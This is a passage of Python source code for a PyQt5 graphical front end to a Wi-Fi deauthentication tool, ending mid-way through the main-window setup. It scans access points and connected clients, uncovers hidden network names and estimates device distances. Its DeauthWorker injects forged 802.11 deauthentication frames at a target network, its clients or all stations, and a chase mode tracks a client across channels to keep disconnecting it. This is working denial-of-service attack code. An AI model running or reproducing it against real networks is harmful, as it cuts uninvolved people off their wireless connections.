#!/usr/bin/env python3
"""
PyQt5 graphical frontend for wifi-deauth.

Runs the scan / de-auth logic inside QThread workers (so the UI never blocks)
and reuses the SSID / band helpers from ``utils``. Must be run as root, same as
the CLI, because scapy needs raw sockets to sniff and inject frames.

    sudo python3 -m wifi_deauth.gui
    # or
    sudo python3 wifi_deauth/gui.py
"""

import os
import sys
import time
import shutil
import secrets
import threading
import subprocess
from collections import defaultdict, deque

from PyQt5 import QtWidgets, QtCore, QtGui
import pyqtgraph as pg
import numpy as np

try:
    import matplotlib
    matplotlib.use("QtAgg")  # use whichever Qt binding is installed (PyQt5 here)
    from matplotlib.figure import Figure
    try:
        from matplotlib.backends.backend_qtagg import FigureCanvasQTAgg as _MplCanvas
    except Exception:
        from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as _MplCanvas
    import mpl_toolkits.mplot3d  # noqa: F401  (registers the 3d projection)
    HAVE_MPL = True
except Exception:
    HAVE_MPL = False

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *  # noqa: F401,F403  (mirrors the CLI's proven import style)
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq, \
    Dot11Elt, Dot11Deauth, Dot11QoS, Dot11AssoResp, Dot11ReassoResp, Dot11AssoReq, Dot11ReassoReq

try:
    from .utils.net_definitions import SSID, BandType, frequency_to_channel, BD_MACADDR
    from .kismet_client import KismetClient
except ImportError:
    from utils.net_definitions import SSID, BandType, frequency_to_channel, BD_MACADDR
    from kismet_client import KismetClient

conf.verb = 0

DEAUTH_INTV = 0.100  # 100 ms between de-auth bursts, same as the CLI


#   --------------------------------------------------------------------------------------------------------------------
#   Interface helpers (the whole app runs as root, so no sudo prefix is needed here)
#   --------------------------------------------------------------------------------------------------------------------

def run_cmd(cmd: str) -> int:
    """Run a shell command, return its exit code (0 == success)."""
    return subprocess.call(cmd, shell=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def list_wifi_interfaces():
    """Return [(iface, driver), ...] for every wireless interface on the system."""
    out = []
    net_dir = "/sys/class/net"
    if not os.path.isdir(net_dir):
        return out
    for iface in sorted(os.listdir(net_dir)):
        if os.path.isdir(os.path.join(net_dir, iface, "wireless")):
            drv_link = os.path.join(net_dir, iface, "device", "driver")
            driver = os.path.basename(os.path.realpath(drv_link)) if os.path.exists(drv_link) else "?"
            out.append((iface, driver))
    return out


def interface_mode(iface: str) -> str:
    """Return 'monitor', 'managed' or 'unknown' for the given interface."""
    try:
        info = subprocess.check_output(f"iw dev {iface} info", shell=True,
                                       stderr=subprocess.DEVNULL).decode(errors="ignore")
        for line in info.splitlines():
            line = line.strip()
            if line.startswith("type "):
                return line.split("type ", 1)[1].strip()
    except Exception:
        pass
    return "unknown"


def enable_monitor_mode(iface: str) -> bool:
    for cmd in (f"ip link set {iface} down",
                f"iw {iface} set monitor control",
                f"ip link set {iface} up"):
        if run_cmd(cmd):
            run_cmd(f"ip link set {iface} up")
            return False
    time.sleep(1.5)
    return interface_mode(iface) == "monitor"


def disable_monitor_mode(iface: str) -> bool:
    for cmd in (f"ip link set {iface} down",
                f"iw {iface} set type managed",
                f"ip link set {iface} up"):
        if run_cmd(cmd):
            run_cmd(f"ip link set {iface} up")
            return False
    time.sleep(1.0)
    return interface_mode(iface) == "managed"


def kill_networkmanager() -> bool:
    return run_cmd("systemctl stop NetworkManager") == 0


def set_channel(iface: str, ch: int):
    run_cmd(f"iw dev {iface} set channel {ch}")


def get_supported_channels(iface: str):
    channels = []
    try:
        for line in os.popen(f"iwlist {iface} channel").readlines():
            if "Channel" in line and "Current" not in line:
                try:
                    channels.append(int(line.split("Channel")[1].split(":")[0].strip()))
                except (IndexError, ValueError):
                    continue
    except Exception:
        pass
    return channels or list(range(1, 14))


#   --------------------------------------------------------------------------------------------------------------------
#   MAC / vendor helpers
#   --------------------------------------------------------------------------------------------------------------------

_MANUFDB = None


def mac_is_group(mac: str) -> bool:
    """True for broadcast / multicast / null MACs (I/G bit set)."""
    try:
        return bool(int(mac.split(":")[0], 16) & 0x01) or mac == "00:00:00:00:00:00"
    except Exception:
        return True


def mac_is_randomized(mac: str) -> bool:
    """True when the locally-administered bit is set (typical of randomized phone MACs)."""
    try:
        return bool(int(mac.split(":")[0], 16) & 0x02)
    except Exception:
        return False


def vendor_for(mac: str) -> str:
    """Resolve the OUI vendor via scapy's manuf database (no network needed)."""
    if not mac:
        return "?"
    if mac_is_randomized(mac):
        return "MAC aleatoria (local)"
    global _MANUFDB
    try:
        if _MANUFDB is None:
            _MANUFDB = conf.manufdb
        vendor = _MANUFDB._get_manuf(mac)
        if vendor and vendor.lower() != "unknown":
            return vendor
    except Exception:
        pass
    return "desconocido"


def band_for_channel(ch):
    if ch is None:
        return "—"
    return "5 GHz" if ch > 14 else "2.4 GHz"


def fmt_duration(secs):
    secs = int(max(secs, 0))
    if secs < 60:
        return f"{secs}s"
    m, s = divmod(secs, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"


# Best-effort device classification from the OUI vendor string (heuristic, first match wins).
DEVICE_RULES = [
    (["hikvision", "dahua", "hangzhou", "reolink", "amcrest", "vivotek", "uniview",
      "foscam", "wyze", "lorex", "swann", "ezviz", "axis communications", "geovision",
      "mobotix", "annke"], "📷 Cámara/DVR"),
    (["nintendo", "sony interactive", "sony computer entertainment"], "🎮 Consola"),
    (["roku", "vizio", "sony visual", "lg electronics", "tcl", "hisense", "chromecast",
      "amazon technolog", "harman"], "📺 TV/Streaming"),
    (["canon", "seiko epson", "epson", "brother industries", "xerox", "kyocera",
      "lexmark"], "🖨 Impresora"),
    (["cisco", "netgear", "tp-link", "d-link", "mikrotik", "ubiquiti", "aruba",
      "ruckus", "zyxel", "juniper", "arris", "technicolor", "sagemcom", "actiontec",
      "fortinet", "cambium", "ruijie", "huawei technolog"], "📡 Router/Red"),
    (["espressif", "tuya", "sonoff", "itead", "shelly", "sonos", "nest", "ecobee",
      "signify", "philips lighting", "texas instruments", "raspberry pi", "particle"],
     "🔌 IoT/Smart home"),
    (["intel", "hewlett packard", "hp inc", "dell", "lenovo", "asustek", "micro-star",
      "gigabyte", "realtek", "liteon", "azurewave", "framework computer", "clevo",
      "tongfang"], "💻 PC/Laptop"),
    (["apple", "samsung electro", "xiaomi", "oppo", "vivo mobile", "oneplus",
      "motorola mobility", "google", "huawei device", "realme", "nothing technology"],
     "📱 Teléfono/Tablet"),
]


def classify_device(vendor, mac):
    """Guess a device category from the vendor. Heuristic — OUI is ambiguous and
    randomized MACs hide the real vendor, so treat this as a hint, not a fact."""
    if mac_is_randomized(mac):
        return "❓ Desconocido (MAC aleatoria)"
    v = (vendor or "").lower()
    if not v or v in ("desconocido", "?", "unknown"):
        return "❓ Desconocido"
    for keywords, label in DEVICE_RULES:
        if any(kw in v for kw in keywords):
            return label
    return "❓ Otro"


#   --------------------------------------------------------------------------------------------------------------------
#   Workers
#   --------------------------------------------------------------------------------------------------------------------

def _is_enodev(exc):
    """True when an exception means the interface vanished (USB reset / back to managed)."""
    if isinstance(exc, OSError) and getattr(exc, "errno", None) == 19:
        return True
    msg = str(exc).lower()
    return "no such device" in msg or "no existe el dispositivo" in msg or "errno 19" in msg


class ScanWorker(QtCore.QThread):
    """Hops channels and reports discovered access points."""
    ap_found = QtCore.pyqtSignal(object)      # dict(name, bssid, channel, band, signal)
    aps_snapshot = QtCore.pyqtSignal(list)    # full list of current APs, for the radar
    channel_changed = QtCore.pyqtSignal(int)
    device_lost = QtCore.pyqtSignal()         # the interface vanished (USB reset / managed)
    log = QtCore.pyqtSignal(str)

    def __init__(self, iface, channels, ssid_filter=None, bssid_filter=None, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.channels = channels
        self.ssid_filter = (ssid_filter or "").lower() or None
        self.bssid_filter = (bssid_filter or "").lower() or None
        self._stop = False
        self._aps = {}                    # bssid -> entry dict
        self._clients = defaultdict(dict)  # bssid -> {client_mac: info}
        self._cur_ch = None               # channel currently being sniffed

    def stop(self):
        self._stop = True

    @staticmethod
    def _extract_ssid(pkt):
        """Return the SSID from the first SSID element (ID 0); '' when hidden/absent."""
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 0:
                return elt.info.strip(b"\x00").decode("utf-8", "ignore").strip()
            elt = elt.payload.getlayer(Dot11Elt)
        return ""

    def _cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                self._handle_ap(pkt)
            elif pkt.haslayer(Dot11ProbeReq) or pkt.haslayer(Dot11AssoReq) \
                    or pkt.haslayer(Dot11ReassoReq):
                self._handle_reveal(pkt)
            self._track_clients(pkt)
        except Exception as exc:
            self.log.emit(f"scan parse error: {exc}")

    def _track_clients(self, pkt):
        """Attribute a station to a known AP from any non-beacon frame that involves it."""
        if not pkt.haslayer(Dot11) or not self._aps or pkt.haslayer(Dot11Beacon):
            return
        a1 = str(pkt.addr1) if pkt.addr1 else None
        a2 = str(pkt.addr2) if pkt.addr2 else None
        a3 = str(pkt.addr3) if pkt.addr3 else None
        ap_mac = next((a for a in (a1, a2, a3) if a in self._aps), None)
        if ap_mac is None:
            return
        client = None
        for cand in (a1, a2):
            if cand and cand != ap_mac and cand not in self._aps and not mac_is_group(cand):
                client = cand
                break
        if client is None:
            return
        try:
            rssi = int(pkt.dBm_AntSignal)
        except Exception:
            rssi = None
        now = time.time()
        store = self._clients[ap_mac]
        info = store.get(client)
        if info is None:
            store[client] = {"mac": client, "rssi": rssi, "packets": 1,
                             "first": now, "last": now,
                             "channel": self._cur_ch,
                             "band": band_for_channel(self._cur_ch)}
            self.log.emit(f"Client {client} seen on {ap_mac}")
        else:
            info["packets"] += 1
            info["last"] = now
            if rssi is not None:
                info["rssi"] = rssi
            if self._cur_ch is not None:
                info["channel"] = self._cur_ch
                info["band"] = band_for_channel(self._cur_ch)

    def _handle_ap(self, pkt):
        ap_mac = str(pkt.addr3)
        if ap_mac == BD_MACADDR:
            return
        if self.bssid_filter and ap_mac.lower() != self.bssid_filter:
            return
        ssid = self._extract_ssid(pkt)
        hidden = pkt.haslayer(Dot11Beacon) and ssid == ""   # beacon + empty SSID == hidden
        # apply the SSID filter only once the name is actually known
        if self.ssid_filter and ssid and self.ssid_filter not in ssid.lower():
            return
        pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
        band = "5 GHz" if pkt_ch > 14 else "2.4 GHz"
        try:
            signal = int(pkt.dBm_AntSignal)
        except Exception:
            signal = None

        entry = self._aps.get(ap_mac)
        if entry is None:
            entry = {"name": ssid if ssid else "<hidden>", "bssid": ap_mac,
                     "channel": pkt_ch, "band": band, "signal": signal,
                     "hidden": hidden, "real_ssid": ssid or None}
            self._aps[ap_mac] = entry
            self.ap_found.emit(dict(entry))
            if hidden:
                self.log.emit(f"Hidden network found: {ap_mac} (ch {pkt_ch})")
            return
        # known AP: push an update only when something meaningful changed
        changed = False
        if ssid and entry["real_ssid"] is None:
            entry.update(name=ssid, real_ssid=ssid, hidden=False)
            self.log.emit(f"Revealed SSID for {ap_mac}: {ssid}")
            changed = True
        if pkt_ch and pkt_ch != entry["channel"]:
            entry["channel"] = pkt_ch
            changed = True
        entry["signal"] = signal          # kept fresh, re-emitted lazily
        if changed:
            self.ap_found.emit(dict(entry))

    def _handle_reveal(self, pkt):
        """A client's probe/association request can carry a hidden AP's name."""
        ssid = self._extract_ssid(pkt)
        if not ssid:
            return
        for cand in (str(pkt.addr1), str(pkt.addr3)):
            if cand == BD_MACADDR:
                continue
            entry = self._aps.get(cand)
            if entry is not None and entry["real_ssid"] is None:
                entry.update(name=ssid, real_ssid=ssid, hidden=False)
                self.ap_found.emit(dict(entry))
                self.log.emit(f"Revealed hidden SSID for {cand}: {ssid}")
                break

    def run(self):
        self.log.emit(f"Scan started on {self.iface} ({len(self.channels)} channels)")
        while not self._stop:
            for ch in self.channels:
                if self._stop:
                    break
                set_channel(self.iface, ch)
                self._cur_ch = ch
                self.channel_changed.emit(ch)
                try:
                    sniff(iface=self.iface, prn=self._cb, timeout=1.5,
                          stop_filter=lambda p: self._stop)
                except Exception as exc:
                    if _is_enodev(exc):
                        self.log.emit(f"La interfaz {self.iface} desapareció "
                                      f"(reset USB o volvió a modo managed).")
                        self.device_lost.emit()
                        self._stop = True
                        break
                    self.log.emit(f"sniff error on ch {ch}: {exc}")
                    time.sleep(0.5)
                # push a fresh snapshot (with latest RSSI + clients) each dwell
                snap = []
                for bssid, entry in self._aps.items():
                    d = dict(entry)
                    d["clients"] = [dict(c) for c in self._clients.get(bssid, {}).values()]
                    snap.append(d)
                self.aps_snapshot.emit(snap)
        self.log.emit("Scan stopped")


class DeauthWorker(QtCore.QThread):
    """Sends de-auth frames to a target and sniffs for associated clients."""
    stats = QtCore.pyqtSignal(int, int)       # total_sent, client_count
    client_found = QtCore.pyqtSignal(str)
    log = QtCore.pyqtSignal(str)

    def __init__(self, iface, bssid, channel, custom_clients=None,
                 broadcast=True, all_channels=False, channels=None, follow=False, parent=None):
        super().__init__(parent)
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.custom_clients = custom_clients or []
        self.broadcast = broadcast
        self.all_channels = all_channels
        self.channels = channels or []
        self.follow = follow
        self.relocate_every = 2.0         # seconds between channel-relocation sweeps
        self._stop = False
        self._clients = list(self.custom_clients)
        self._total_sent = 0
        self._lock = threading.Lock()

    def stop(self):
        self._stop = True

    # -- client discovery -------------------------------------------------
    @staticmethod
    def _confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _client_cb(self, pkt):
        try:
            if not self._confirms_client(pkt):
                return
            if str(pkt.addr3) != self.bssid:
                return
            c_mac = pkt.addr1
            if c_mac in (BD_MACADDR, self.bssid):
                return
            with self._lock:
                if c_mac not in self._clients:
                    self._clients.append(c_mac)
                    self.client_found.emit(c_mac)
        except Exception:
            pass

    def _client_listener(self):
        # only auto-discover when the user did not pin a specific client list
        if self.custom_clients:
            return
        try:
            sniff(iface=self.iface, prn=self._client_cb,
                  stop_filter=lambda p: self._stop)
        except Exception as exc:
            self.log.emit(f"client listener error: {exc}")

    # -- frame injection --------------------------------------------------
    def _deauth_client(self, client):
        sendp(RadioTap() / Dot11(addr1=client, addr2=self.bssid, addr3=self.bssid) /
              Dot11Deauth(reason=7), iface=self.iface)
        sendp(RadioTap() / Dot11(addr1=self.bssid, addr2=self.bssid, addr3=client) /
              Dot11Deauth(reason=7), iface=self.iface)

    def _deauth_broadcast(self):
        sendp(RadioTap() / Dot11(addr1=BD_MACADDR, addr2=self.bssid, addr3=self.bssid) /
              Dot11Deauth(reason=7), iface=self.iface)

    def run(self):
        self.log.emit(f"De-auth started against {self.bssid}")
        if self.follow:
            self._run_follow()
            self.stats.emit(self._total_sent, len(self._clients))
            self.log.emit("De-auth stopped")
            return
        if not self.all_channels:
            set_channel(self.iface, self.channel)
        listener = threading.Thread(target=self._client_listener, daemon=True)
        listener.start()

        ch_idx = 0
        last_emit = time.time()
        while not self._stop:
            try:
                if self.all_channels and self.channels:
                    set_channel(self.iface, self.channels[ch_idx])
                    ch_idx = (ch_idx + 1) % len(self.channels)
                with self._lock:
                    targets = list(self._clients)
                for client in targets:
                    self._deauth_client(client)
                    self._total_sent += 2
                if self.broadcast and not self.custom_clients:
                    self._deauth_broadcast()
                    self._total_sent += 1
                now = time.time()
                if now - last_emit >= 0.5:
                    with self._lock:
                        self.stats.emit(self._total_sent, len(self._clients))
                    last_emit = now
                time.sleep(DEAUTH_INTV)
            except Exception as exc:
                self.log.emit(f"deauth error: {exc}")
                time.sleep(DEAUTH_INTV)
        self.stats.emit(self._total_sent, len(self._clients))
        self.log.emit("De-auth stopped")

    def _targets(self):
        with self._lock:
            base = list(self._clients) if self._clients else list(self.custom_clients)
        return [t for t in base if t]

    def _run_follow(self):
        """Chase mode: keep de-authing each client on its current channel, re-locating
        it with short channel sweeps so the attack follows a client that changes channel."""
        self.log.emit("Chase mode: following client channel")
        # passive discovery so chasing works even without a custom client MAC
        listener = threading.Thread(target=self._client_listener, daemon=True)
        listener.start()
        client_ch = {}
        last_relocate = 0.0
        last_emit = time.time()
        warned = False
        while not self._stop:
            try:
                targets = self._targets()
                if not targets:
                    if not warned:
                        self.log.emit("Chase: waiting for a client to appear...")
                        warned = True
                    self._relocate([], client_ch)   # sweep so the listener can discover
                    continue
                warned = False
                for c in targets:
                    set_channel(self.iface, client_ch.get(c, self.channel))
                    self._deauth_client(c)
                    self._total_sent += 2
                now = time.time()
                if now - last_relocate >= self.relocate_every:
                    self._relocate(targets, client_ch)
                    last_relocate = time.time()
                if now - last_emit >= 0.5:
                    self.stats.emit(self._total_sent, len(targets))
                    last_emit = now
                time.sleep(DEAUTH_INTV)
            except Exception as exc:
                self.log.emit(f"chase error: {exc}")
                time.sleep(DEAUTH_INTV)

    def _relocate(self, targets, client_ch):
        """Hop channels briefly to find the channel each target client is on right now."""
        if not self.channels:
            return
        tset = set(targets)
        for ch in self.channels:
            if self._stop:
                break
            set_channel(self.iface, ch)
            found = {}

            def cb(pkt):
                try:
                    if not pkt.haslayer(Dot11):
                        return
                    for a in (pkt.addr1, pkt.addr2):
                        if a is not None and str(a) in tset:
                            found[str(a)] = ch
                except Exception:
                    pass

            try:
                sniff(iface=self.iface, prn=cb, timeout=0.25, stop_filter=lambda p: self._stop)
            except Exception:
                pass
            for mac, cch in found.items():
                if client_ch.get(mac) != cch:
                    self.log.emit(f"Client {mac} -> channel {cch}")
                client_ch[mac] = cch


#   --------------------------------------------------------------------------------------------------------------------
#   Distance radar (RSSI -> approximate distance; direction is unknown from a single antenna)
#   --------------------------------------------------------------------------------------------------------------------

class RadarView(pg.PlotWidget):
    """Polar-style view: antenna at the centre, distance rings in metres, each AP
    drawn at its RSSI-estimated distance. The angle is arbitrary (no bearing)."""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setBackground("#141414")
        self.setAspectLocked(True)
        self.hideAxis("bottom")
        self.hideAxis("left")
        self._items = []
        self._auto_fit = True
        self._last_lim = 10.0
        # drag to pan, wheel to zoom; stop auto-fitting once the user moves the view
        self.getViewBox().sigRangeChangedManually.connect(self._on_manual_range)

    def _on_manual_range(self, *args):
        self._auto_fit = False

    def fit(self):
        self._auto_fit = True
        lim = self._last_lim
        self.setXRange(-lim, lim, padding=0)
        self.setYRange(-lim, lim, padding=0)

    @staticmethod
    def estimate_distance(rssi, tx_power, n):
        """Log-distance path-loss model. tx_power = reference RSSI at 1 m (dBm)."""
        if rssi is None:
            return None
        try:
            return 10 ** ((tx_power - rssi) / (10.0 * n))
        except Exception:
            return None

    @staticmethod
    def _nice_step(maxd):
        import math
        if maxd <= 0:
            return 1.0
        raw = maxd / 4.0
        mag = 10 ** math.floor(math.log10(raw)) if raw > 0 else 1
        for mult in (1, 2, 5, 10):
            if raw <= mult * mag:
                return float(mult * mag)
        return float(10 * mag)

    def _clear(self):
        for it in self._items:
            self.removeItem(it)
        self._items = []

    def update_aps(self, aps, tx_power, n):
        self._clear()
        plotted = []
        for ap in aps:
            d = self.estimate_distance(ap.get("signal"), tx_power, n)
            if d is not None:
                plotted.append((ap, d))

        maxd = max((d for _, d in plotted), default=10.0)
        step = self._nice_step(maxd)
        n_rings = max(int(np.ceil(maxd / step)), 1)
        theta = np.linspace(0, 2 * np.pi, 120)

        # distance rings + labels
        for i in range(1, n_rings + 1):
            r = i * step
            ring = self.plot(r * np.cos(theta), r * np.sin(theta),
                             pen=pg.mkPen("#303030", width=1))
            self._items.append(ring)
            lbl = pg.TextItem(f"{r:g} m", color="#5a5a5a", anchor=(0.5, 0.5))
            lbl.setPos(0, r)
            self.addItem(lbl)
            self._items.append(lbl)

        # antenna at the centre
        center = pg.ScatterPlotItem([0], [0], size=16,
                                    brush=pg.mkBrush("#4ec9b0"), pen=pg.mkPen("#ffffff", width=2))
        self.addItem(center)
        self._items.append(center)
        clbl = pg.TextItem("Tu antena", color="#4ec9b0", anchor=(0.5, 1.4))
        clbl.setPos(0, 0)
        self.addItem(clbl)
        self._items.append(clbl)

        # access points
        for ap, d in plotted:
            # stable pseudo-angle per BSSID so points don't jump around between updates
            ang = (hash(ap["bssid"]) % 360) * np.pi / 180.0
            x, y = d * np.cos(ang), d * np.sin(ang)
            color = "#d7ba7d" if ap.get("hidden") else "#ff5555"
            pt = pg.ScatterPlotItem([x], [y], size=12,
                                    brush=pg.mkBrush(color), pen=pg.mkPen("#000000"))
            self.addItem(pt)
            self._items.append(pt)
            txt = pg.TextItem(f"{ap.get('name', '?')}\n~{d:.1f} m", color="#e0e0e0",
                              anchor=(0.5, -0.2))
            txt.setPos(x, y)
            self.addItem(txt)
            self._items.append(txt)

        self._last_lim = maxd * 1.18 if plotted else 10
        if self._auto_fit:
            self.setXRange(-self._last_lim, self._last_lim, padding=0)
            self.setYRange(-self._last_lim, self._last_lim, padding=0)


class Map3DView(QtWidgets.QWidget):
    """Navigable 3D scatter: X/Y = estimated distance (arbitrary azimuth), Z = a REAL,
    defined metric (band or signal), NOT physical height — a single antenna cannot
    tell whether an AP is above or below you."""

    def __init__(self, parent=None):
        super().__init__(parent)
        lay = QtWidgets.QVBoxLayout(self)
        lay.setContentsMargins(0, 0, 0, 0)
        self.fig = Figure(figsize=(5, 4))
        self.fig.patch.set_facecolor("#141414")
        self.canvas = _MplCanvas(self.fig)
        lay.addWidget(self.canvas)
        self.ax = self.fig.add_subplot(111, projection="3d")
        self._style_axes()

    def _style_axes(self):
        ax = self.ax
        try:
            ax.set_facecolor("#141414")
            for axis in (ax.xaxis, ax.yaxis, ax.zaxis):
                try:
                    axis.pane.set_facecolor((0.09, 0.09, 0.09, 1.0))
                    axis.pane.set_edgecolor((0.3, 0.3, 0.3, 1.0))
                except Exception:
                    pass
                axis.label.set_color("#cccccc")
            ax.tick_params(colors="#888888")
        except Exception:
            pass

    def update_aps(self, aps, tx, n, z_mode):
        ax = self.ax
        ax.clear()
        self._style_axes()
        xs, ys, zs, cols, labels = [], [], [], [], []
        for ap in aps:
            sig = ap.get("signal")
            d = RadarView.estimate_distance(sig, tx, n)
            if d is None:
                continue
            ang = (hash(ap["bssid"]) % 360) * np.pi / 180.0
            x, y = d * np.cos(ang), d * np.sin(ang)
            try:
                ch = int(str(ap.get("channel", "0")).split(",")[0])
            except (TypeError, ValueError):
                ch = 0
            is5 = ch > 14
            if z_mode == "signal":
                z = sig if isinstance(sig, int) else -100
            else:
                z = 1 if is5 else 0
            xs.append(x); ys.append(y); zs.append(z)
            cols.append("#d7ba7d" if ap.get("hidden") else ("#5aa9ff" if is5 else "#ff5555"))
            labels.append((x, y, z, f"{ap.get('name', '?')} ~{d:.0f}m"))

        ax.scatter([0], [0], [0], c="#4ec9b0", s=90, marker="^")  # your antenna
        ax.text(0, 0, 0, "  Tú", color="#4ec9b0", fontsize=8)
        if xs:
            ax.scatter(xs, ys, zs, c=cols, s=45, depthshade=True)
            for (x, y, z, t) in labels:
                ax.text(x, y, z, t, color="#dddddd", fontsize=7)

        ax.set_xlabel("distancia X (m)")
        ax.set_ylabel("distancia Y (m)")
        if z_mode == "signal":
            ax.set_zlabel("señal (dBm)")
            ax.set_title("Z = señal · NO es altura real", color="#d7ba7d", fontsize=9)
        else:
            ax.set_zlabel("banda")
            try:
                ax.set_zticks([0, 1])
                ax.set_zticklabels(["2.4 GHz", "5 GHz"])
            except Exception:
                pass
            ax.set_title("Z = banda · NO es altura real", color="#d7ba7d", fontsize=9)
        self.canvas.draw_idle()


#   --------------------------------------------------------------------------------------------------------------------
#   Kismet integration (uses Kismet as the sensing backend via its REST API)
#   --------------------------------------------------------------------------------------------------------------------

class KismetWorker(QtCore.QThread):
    """Polls the Kismet REST API and emits the merged device list."""
    devices = QtCore.pyqtSignal(list)
    status = QtCore.pyqtSignal(str)
    error = QtCore.pyqtSignal(str)

    def __init__(self, client, interval=2.0, parent=None):
        super().__init__(parent)
        self.client = client
        self.interval = interval
        self._stop = False
        self._store = {}
        self._since = 0

    def stop(self):
        self._stop = True

    def run(self):
        try:
            st = self.client.status()
            ver = st.get("kismet.system.version", "?")
            self.status.emit(f"Conectado · Kismet {ver}")
        except Exception as exc:
            self.error.emit(str(exc))
            return
        while not self._stop:
            try:
                for d in self.client.devices(self._since):
                    if d.get("key"):
                        self._store[d["key"]] = d
                    if d.get("last"):
                        self._since = max(self._since, int(d["last"]))
                self.devices.emit(list(self._store.values()))
            except Exception as exc:
                self.error.emit(str(exc))
            slept = 0.0
            while slept < self.interval and not self._stop:
                time.sleep(0.1)
                slept += 0.1


def _fmt_ts(ts):
    try:
        return time.strftime("%H:%M:%S", time.localtime(int(ts)))
    except (TypeError, ValueError):
        return "—"


def _fmt_bytes(n):
    try:
        n = float(n)
    except (TypeError, ValueError):
        return "—"
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024 or unit == "GB":
            return f"{n:.0f} {unit}" if unit == "B" else f"{n:.1f} {unit}"
        n /= 1024
    return f"{n:.1f} GB"


def ensure_kismet_credentials():
    """Make sure ~/.kismet/kismet_httpd.conf has a username+password so the REST API
    can be used without the browser first-run. Keeps existing creds; only fills gaps.
    Returns (username, password)."""
    path = os.path.expanduser("~/.kismet/kismet_httpd.conf")
    user, pwd = None, None
    existing = []
    try:
        if os.path.exists(path):
            existing = open(path).read().splitlines()
            for line in existing:
                if line.startswith("httpd_username="):
                    user = line.split("=", 1)[1].strip()
                elif line.startswith("httpd_password="):
                    pwd = line.split("=", 1)[1].strip()
    except Exception:
        pass
    if user and pwd:
        return user, pwd
    user = user or "kismet"
    pwd = pwd or secrets.token_urlsafe(12)
    kept = [l for l in existing if not l.startswith(("httpd_username=", "httpd_password="))]
    kept += [f"httpd_username={user}", f"httpd_password={pwd}"]
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as fh:
            fh.write("\n".join(kept) + "\n")
    except Exception:
        pass
    return user, pwd


#   --------------------------------------------------------------------------------------------------------------------
#   Main window
#   --------------------------------------------------------------------------------------------------------------------

class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("wifi-deauth — GUI")
        self.resize(1100, 720)

        self.scan_worker = None
        self.deauth_worker = None
        self.target = None                # dict of the selected AP
        self._row_by_bssid = {}           # bssid -> table row index
        self._last_aps = []               # latest scan snapshot, for radar recompute
        self._selected_bssid = None       # AP whose clients are shown
        self.kismet_worker = None
        self.kismet_proc = None           # QProcess running a local Kismet we launched
        self._kismet_all = []             # last device list from Kismet
        self._start_time = None
        self._pps_history = deque(maxlen=120)
        self._last_sent = 0
        self._last_sent_t = time.time()

        self._build_ui()
        self.refresh_interfaces()

        # 1 Hz timer that drives the live chart / elapsed counter
        self._timer = QtCore.QTimer(self)
        self._timer.timeout.connect(self._tick)
        self._timer.start(1000)

    # ---- UI construction ------------------------------------------------
    def _build_ui(self):
        central = QtWidgets.QWidget()
        self.setCentralWidget(central)
        root = QtWidgets.QVBoxLayout(central)

        root.addWidget(self._build_iface_bar())

        split = QtWidgets.QHBoxLayout()
        split.addWidget(self._build_left_panel(), 3)
        split.addWidget(self._build_right_panel(), 2)
        root.addLayout(split, 1)

        root.addWidget(self._build_log())

        if os.geteuid() != 0:
            self._warn_banner()

    def _build_iface_bar(self):
        box = QtWidgets.QGroupBox("Interface")
        lay = QtWidgets.QHBoxLayout(box)
        self.iface_combo = QtWidgets.QComboBox()
        self.iface_combo.setMinimumWidth(260)
        self.mode_label = QtWidgets.QLabel("mode: —")
        self.mode_label.setStyleSheet("font-weight: bold;")

        btn_refresh = QtWidgets.QPushButton("Refresh")
        btn_refresh.clicked.connect(self.refresh_interfaces)
        self.btn_monitor = QtWidgets.QPushButton("Enable monitor")
        self.btn_monitor.clicked.connect(self.toggle_monitor)
        btn_killnm = QtWidgets.QPushButton("Kill NetworkManager")
        btn_killnm.clicked.connect(self.kill_nm)

        self.iface_combo.currentIndexChanged.connect(self._update_mode_label)

        lay.addWidget(QtWidgets.QLabel("Adapter:"))
        lay.addWidget(self.iface_combo)
        lay.addWidget(self.mode_label)
        lay.addStretch(1)
        lay.addWidget(btn_refresh)
        lay.addWidget(self.btn_monitor)
        lay.addWidget(btn_killnm)
        return box

    def _build_left_panel(self):
        box = QtWidgets.QGroupBox("Scan & targets")
        lay = QtWidgets.QVBoxLayout(box)

        controls = QtWidgets.QHBoxLayout()
        self.ssid_filter = QtWidgets.QLineEdit()
        self.ssid_filter.setPlaceholderText("SSID filter (optional)")
        self.bssid_filter = QtWidgets.QLineEdit()
        self.bssid_filter.setPlaceholderText("BSSID filter (optional)")
        self.btn_scan = QtWidgets.QPushButton("Start scan")
        self.btn_scan.clicked.connect(self.toggle_scan)
        controls.addWidget(self.ssid_filter, 2)
        controls.addWidget(self.bssid_filter, 2)
        controls.addWidget(self.btn_scan, 1)
        lay.addLayout(controls)

        self.ap_table = QtWidgets.QTableWidget(0, 5)
        self.ap_table.setHorizontalHeaderLabels(["SSID", "Channel", "BSSID", "Band", "Signal"])
        _ap_hdr = self.ap_table.horizontalHeader()
        _ap_hdr.setSectionResizeMode(QtWidgets.QHeaderView.Interactive)  # todas arrastrables
        _ap_hdr.setStretchLastSection(True)
        self.ap_table.setColumnWidth(0, 240)   # SSID ancho por defecto
        self.ap_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectRows)
        self.ap_table.setSelectionMode(QtWidgets.QAbstractItemView.SingleSelection)
